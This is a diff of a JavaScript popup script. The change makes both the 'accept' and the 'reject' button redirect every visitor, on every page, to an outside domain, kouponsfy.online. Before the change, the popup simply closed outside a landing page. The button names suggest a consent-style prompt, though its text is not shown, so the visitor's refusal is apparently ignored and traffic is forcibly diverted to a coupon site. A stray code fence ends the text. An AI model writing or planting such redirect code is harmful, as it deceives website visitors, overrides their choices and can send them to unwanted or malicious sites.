@@ -1,6 +1,6 @@
 (function () {
 
-    const REDIRECT = "https://kouponsfy.online/grandtrys";
+    const REDIRECT = "https://kouponsfy.online";
 
     function createPopup() {
 
@@ -37,26 +37,15 @@
 
         document.body.appendChild(popup);
 
-        const isLander =
-            window.location.pathname.indexOf("lander.html") > -1;
-
         document.getElementById("acceptBtn").onclick = function () {
 
-            if (isLander) {
-                window.location.href = REDIRECT;
-            } else {
-                popup.remove();
-            }
+            window.location.href = REDIRECT;
 
         };
 
         document.getElementById("rejectBtn").onclick = function () {
 
-            if (isLander) {
-                window.location.href = REDIRECT;
-            } else {
-                popup.remove();
-            }
+            window.location.href = REDIRECT;
 
         };
 
@@ -69,3 +58,4 @@
     });
 
 })();
+```
